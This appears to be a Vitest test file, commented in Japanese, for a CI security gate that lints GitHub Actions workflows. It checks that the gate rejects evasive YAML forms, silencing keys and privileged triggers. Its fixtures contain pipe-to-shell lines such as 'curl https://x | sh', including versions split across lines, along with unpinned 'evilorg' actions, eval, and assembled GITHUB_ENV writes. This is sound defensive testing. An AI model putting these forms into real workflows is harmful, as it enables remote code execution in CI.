import { describe, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import path from 'node:path';
import { readOriginalSource } from './originalSource';

/**
 * 行単位の規則が読めない YAML の書き方と、ゲートを黙らせる鍵 (2026-10-20 · パス 544 · threat: T-145)。
 * 実測: `- {uses: evilorg/act@v1}`・`- "run": curl … | sh`・`jobs: {a: {steps: [{run: …}]}}` は
 * js-yaml で同じ step と読めるのに、lint:workflow-security は exit 0 だった。ci.yml の step に
 * `continue-on-error: true` や `if:` を足すと、ゲートが赤にならずに CI の実効が消えた。
 */
const req = createRequire(import.meta.url);
const gate = req('../../../scripts/lint-workflow-security.cjs') as {
  structureProblems: (name: string, text: string) => { file: string; why: string }[];
  yamlParseProblem: (name: string, text: string) => { file: string; why: string } | null;
  workflows: () => { name: string; text: string }[];
  check: (list: { name: string; text: string }[], allow: object, jobAllow: object) => { file: string; why: string }[];
  runBodyProblem: (line: string) => string | null;
};
const HEAD = 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n';

describe('workflow の構造 — 読めない形と黙らせる鍵 (threat: T-145)', () => {
  it.each([
    ['フローの step', `${HEAD}      - {uses: evilorg/act@v1}\n`],
    ['フローの steps', 'jobs:\n  a:\n    steps: [{run: curl x | sh}]\n'],
    ['フローの jobs', 'jobs: {a: {steps: []}}\n'],
    ['引用符つきの run', `${HEAD}      - "run": curl https://x | sh\n`],
    ['引用符つきの uses', `${HEAD}      - "uses": evilorg/act@v1\n`],
  ])('★ %s は落とす', (_n, text) => {
    expect(gate.structureProblems('x.yml', text).length).toBeGreaterThan(0);
  });

  it.each([
    ['continue-on-error', 'continue-on-error: true'],
    ['if', "if: github.event_name != 'pull_request'"],
    ['shell', "shell: bash -c 'true; #{0}'"],
    ['working-directory', 'working-directory: /tmp'],
    ['paths-ignore', "paths-ignore: ['scripts/**']"],
  ])('★ ci.yml / pages.yml では %s を置けない', (_n, line) => {
    const text = `${HEAD}      - run: npm run lint:malware\n        ${line}\n`;
    expect(gate.structureProblems('ci.yml', text).length).toBeGreaterThan(0);
    expect(gate.structureProblems('pages.yml', text).length).toBeGreaterThan(0);
  });

  it('対照: ほかの workflow の if: と、ブロック記法の通常の step は落とさない', () => {
    const text = `${HEAD}      - run: echo\n        if: always()\n`;
    expect(gate.structureProblems('mutation.yml', text)).toEqual([]);
    expect(gate.structureProblems('ci.yml', `${HEAD}      - run: npm run lint:malware\n`)).toEqual([]);
  });

  it('★ 実物の ci.yml / pages.yml は構造の規則を通る (今 0 件)', () => {
    for (const f of ['ci.yml', 'pages.yml']) {
      const text = readOriginalSource(path.join(__dirname, '../../../.github/workflows', f));
      expect(gate.structureProblems(f, text), f).toEqual([]);
    }
  });
});

/**
 * release.yml の `verify` ジョブ (署名する `build` が needs で待つ検査) の step を黙らせる鍵 (threat: T-182)。
 * 実測: "Typecheck + test + gates" に `continue-on-error: true` を足しても structureProblems は [] を返した。
 */
describe('release.yml の verify ジョブは黙らせる鍵を置けない (threat: T-182)', () => {
  const release = readOriginalSource(path.join(__dirname, '../../../.github/workflows/release.yml'));
  const STEP = '      - name: Typecheck + test + gates\n';
  it.each([
    ['continue-on-error', '        continue-on-error: true\n'],
    ['if', '        if: always()\n'],
    ['shell', '        shell: sh\n'],
    ['working-directory', '        working-directory: src\n'],
  ])('★ verify の step に %s を足すと落とす', (_n, add) => {
    expect(release).toContain(STEP);
    const bad = release.replace(STEP, STEP + add);
    expect(gate.structureProblems('release.yml', bad).length).toBeGreaterThan(0);
  });

  it('★ verify の job 直下に continue-on-error を足しても落とす', () => {
    const bad = release.replace('    defaults:\n', '    continue-on-error: true\n    defaults:\n');
    expect(bad).not.toBe(release);
    expect(gate.structureProblems('release.yml', bad).length).toBeGreaterThan(0);
  });

  it('対照: 実物の release.yml は通る。build ジョブの if: と環境は対象外', () => {
    expect(gate.structureProblems('release.yml', release)).toEqual([]);
    expect(release).toContain('    environment: release');
  });
});

describe('特権つきの起動条件は新しい workflow に置けない (threat: T-182)', () => {
  const BODY = 'permissions:\n  contents: read\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n';
  it.each(['workflow_run', 'issue_comment', 'pull_request_review', 'pull_request_review_comment', 'discussion', 'discussion_comment'])(
    '★ on: %s は落とす',
    (trigger) => {
      const text = `on:\n  ${trigger}:\n    types: [completed]\n${BODY}`;
      expect(gate.check([{ name: 'x.yml', text }], {}, {}).some((p) => p.why.includes(trigger))).toBe(true);
    },
  );
  it('対照: push / pull_request / workflow_dispatch と permissions の issues: write は落とさない', () => {
    const text = `on:\n  push:\n  pull_request:\n  workflow_dispatch:\npermissions:\n  issues: write\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n`;
    expect(gate.check([{ name: 'x.yml', text }], {}, {})).toEqual([]);
  });
});

/**
 * 公開する HTML に悪意コードの形の走査が掛かる (threat: T-143)。pages.yml は ci.yml と並行に走るだけで
 * `needs:` が無く、あちらが赤でも公開は終わる —— 公開の直前に自分で走査する。
 */
describe('pages.yml — 公開する HTML は悪意コードの形も走査する (threat: T-143)', () => {
  const pages = readOriginalSource(path.join(__dirname, '../../../.github/workflows/pages.yml'));
  it('★ CSP を検める HTML は全部、lint-malware --artifact の対象にも在る', () => {
    const cspStep = pages.slice(pages.indexOf('lint-artifact-csp.cjs'), pages.indexOf('upload-pages-artifact'));
    const published = [...cspStep.matchAll(/_site\/[\w-]+\.html/g)].map((m) => m[0]);
    expect(published.length).toBeGreaterThanOrEqual(7);
    const malwareStep = pages.slice(pages.indexOf('lint-malware.cjs --artifact'));
    expect(malwareStep).toContain('lint-malware.cjs --artifact "$f"');
    const loop = pages.slice(pages.lastIndexOf('for f in'), pages.indexOf('done', pages.lastIndexOf('for f in')));
    for (const h of published) expect(loop, h).toContain(h);
  });
});

/**
 * js-yaml が同じ step と読むのに行頭の `uses:` / `run:` の規則に映らない書き方 (2026-10-21 · threat: T-160)。
 * 実測: 未固定の第三者 action が `uses : x@v1` / `uses:` + 次行 / `- &a uses: x@v1` で、`curl … |` + 次行の `sh` と
 * 名前を組み立てた GITHUB_ENV への書き込みが exit 0 で通った。読めない形は落とす。
 */
describe('workflow の構造 — 書き方の揺れでゲートを迂回できない (threat: T-160)', () => {
  const gateCheck = (text: string) => gate.check([{ name: 'x.yml', text }], {}, {});
  it.each([
    ['鍵と : の間の空白', `${HEAD}      - uses : evilorg/act@v1\n`],
    ['uses の値を次の行へ', `${HEAD}      - uses:\n          evilorg/act@v1\n`],
    ['アンカー付きの step', `${HEAD}      - &a uses: evilorg/act@v1\n`],
    ['エイリアスの値', `${HEAD}      - uses: *a\n`],
    ['タグ付きの値', `${HEAD}      - run: !!str curl https://x | sh\n`],
    ['マージキー', `${HEAD}      - <<: *base\n`],
  ])('★ %s は落とす', (_n, text) => {
    expect(gate.structureProblems('x.yml', text).length).toBeGreaterThan(0);
  });

  it('★ curl の次の行に sh が続く形 (| の行末・\\ の継続) も 1 本のシェル行として断る', () => {
    const pipe = `${HEAD}      - run: |\n          curl https://x |\n            sh\n`;
    const slash = `${HEAD}      - run: |\n          curl https://x \\\n            | sh\n`;
    for (const t of [pipe, slash]) {
      expect(gateCheck(t).some((p) => /curl \| sh/.test(p.why)), t).toBe(true);
    }
  });

  it('★ 書き込み先を組み立てる・eval する run の行は断る', () => {
    expect(gate.runBodyProblem('echo "A=b" >> "${F}NV"')).not.toBeNull();
    expect(gate.runBodyProblem('echo "A=b" >> "$(printf GITHUB_ENV)"')).not.toBeNull();
    expect(gate.runBodyProblem('eval "$X"')).not.toBeNull();
  });

  it('対照: 単独の変数への追記・普通の 1 行・コマンドの継続は落とさない', () => {
    expect(gate.runBodyProblem('echo "k=v" >> "$GITHUB_OUTPUT"')).toBeNull();
    expect(gate.runBodyProblem('echo hi >> "$GITHUB_STEP_SUMMARY"')).toBeNull();
    expect(gate.runBodyProblem('npm run build && echo evaluate')).toBeNull();
    const ok = `${HEAD}      - run: |\n          npm ci &&\n            npm test\n`;
    expect(gateCheck(ok).filter((p) => /run:/.test(p.why))).toEqual([]);
    // `run: |` の見出し行は `|` で終わるが継続ではない (次の行と畳むと、見出しが偽の違反になる)
    // 見出しを次の行と畳むと、同じ違反が見出しの行にも二重に報告される (1 件のはずが 2 件)。
    const header = `${HEAD}      - run: |\n          echo "A=b" >> "\${F}NV"\n`;
    expect(gateCheck(header).filter((p) => /run:/.test(p.why))).toHaveLength(1);
    expect(gate.structureProblems('x.yml', `${HEAD}      - uses: actions/checkout@${'c'.repeat(40)} # v1\n`)).toEqual([]);
  });

  it('★ 実物の workflow 7 本は新しい構造の規則を通る (今 0 件)', () => {
    const dir = path.join(__dirname, '../../../.github/workflows');
    for (const f of ['ci.yml', 'pages.yml', 'release.yml', 'mutation.yml', 'e2e.yml', 'dependency-audit.yml', 'knowledge-auto.yml']) {
      const text = readOriginalSource(path.join(dir, f));
      expect(gate.structureProblems(f, text), f).toEqual([]);
    }
  });
});

/**
 * workflow は YAML として読めること (2026-10-23 · パス 546)。#827 が step 名に `: ` を含めて e2e.yml を壊し、
 * GitHub は push のたびに 0 秒の失敗 run を作り、手動実行も `run-e2e` ラベルも効かなかった。
 * 行単位の門は exit 0・ci.yml も緑のままだった。
 */
describe('workflow は YAML として読める (パス 546 · threat: T-168)', () => {
  it('★ 実物の workflow は全部、読めて on / jobs を持つ', () => {
    const list = gate.workflows().filter((w) => w.name.endsWith('.yml') && !w.name.includes('/'));
    expect(list.length).toBeGreaterThanOrEqual(7);
    for (const w of list) {
      expect(gate.yamlParseProblem(w.name, w.text), w.name).toBeNull();
    }
  });

  it('★ step 名に ": " を含む引用符なしの値は落とす (e2e.yml を壊した形)', () => {
    const bad = 'jobs:\n  a:\n    steps:\n      - name: Smoke (packaged app: fuses applied)\n        run: echo\n';
    const p = gate.yamlParseProblem('e2e.yml', bad);
    expect(p).not.toBeNull();
    expect(p?.file).toBe('e2e.yml:4');
    expect(p?.why).toContain('YAML として読めない');
  });

  it('対照: 引用符で囲んだ値・コメントの ": " は通す', () => {
    expect(gate.yamlParseProblem('x.yml', "jobs:\n  a:\n    steps:\n      - name: 'Smoke (a: b)'\n        run: echo\n")).toBeNull();
    expect(gate.yamlParseProblem('x.yml', 'jobs:\n  a:\n    steps:\n      # a: b\n      - run: echo\n')).toBeNull();
  });
});
